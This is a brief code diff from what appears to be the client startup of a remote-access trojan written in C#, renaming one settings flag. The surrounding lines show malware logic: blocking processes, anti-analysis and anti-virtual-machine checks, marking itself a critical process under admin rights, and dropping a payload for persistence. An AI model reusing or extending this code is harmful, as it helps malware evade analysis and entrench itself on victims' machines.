@@ -23,7 +23,7 @@ namespace Client
                     AntiProcess.StartBlock();
                 if (Convert.ToBoolean(Settings.An_ti)) //run anti-virtual environment
                     Anti_Analysis.RunAntiAnalysis();
-                if (Convert.ToBoolean(Settings.BD_OS) && Methods.IsAdmin()) //active critical process
+                if (Convert.ToBoolean(Settings.BS_OD) && Methods.IsAdmin()) //active critical process
                     ProcessCritical.Set();
                 if (Convert.ToBoolean(Settings.In_stall)) //drop payload [persistence]
                     NormalStartup.Install();
